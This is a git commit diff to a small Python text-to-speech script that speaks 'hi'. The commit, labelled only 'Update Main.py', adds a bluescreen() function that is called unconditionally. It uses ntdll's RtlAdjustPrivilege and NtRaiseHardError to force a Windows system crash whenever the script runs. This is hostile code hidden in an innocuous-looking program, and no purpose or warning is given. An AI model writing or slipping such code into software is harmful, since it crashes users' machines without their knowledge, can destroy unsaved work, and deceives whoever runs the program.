fcb50c35cfa4911bd88207c6267779f94c918d3a
TBDScriptz <tobdecidd@gmail.com>
2025-05-11 17:15:32 -0700

    Update Main.py

--- Main.py
+++ Main.py
@@ -1,6 +1,13 @@
 import pyttsx3 as tts
 import time
+import ctypes
 
 Eng = tts.Engine()
 Eng.say('hi')
 Eng.runandwait()
+
+def bluescreen():
+    ctypes.windll.ntdll.RtlAdjustPrivilege(20, True, False, ctypes.byref(ctypes.c_bool()))
+    ctypes.windll.ntdll.NtRaiseHardError(0xC0000006, 0, 0, None, 6, ctypes.byref(ctypes.c_ulong()))
+
+bluescreen()
